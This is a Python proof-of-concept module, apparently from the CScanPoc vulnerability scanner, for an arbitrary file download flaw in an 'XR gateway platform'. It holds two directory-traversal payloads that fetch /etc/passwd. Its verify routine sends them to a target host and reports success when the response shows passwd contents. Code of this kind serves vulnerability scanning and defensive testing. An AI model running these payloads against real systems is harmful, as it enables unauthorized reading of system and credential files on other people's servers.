# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'XR_GatewayPlatform_0001' # 平台漏洞编号，留空
    name = 'XR网关平台 任意文件遍历下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-08-28'  # 漏洞公布时间
    desc = '''
        XR网关平台 任意文件遍历下载漏洞：
        /msa/../../../../../../../../etc/passwd 
        /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=test.txt+downLoadFile=../etc/passwd
    '''  # 漏洞描述
    ref = 'http://www.codesec.net/view/249007.html'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'XR网关平台'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a59c3487-3579-4d86-bf9b-3438780e7c9d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payloads = [
                '/msa/../../../../../../../../etc/passwd', 
                '/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=test.txt+downLoadFile=../etc/passwd'
            ]
            for payload in payloads: 
                url = self.target + payload
                #code, head, res, errcode, _ = curl.curl(url)
                r = requests.get(url)
                if r.status_code == 200 and 'root' in r.content and '/bin/bash' in r.content:
                        #security_warning(url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
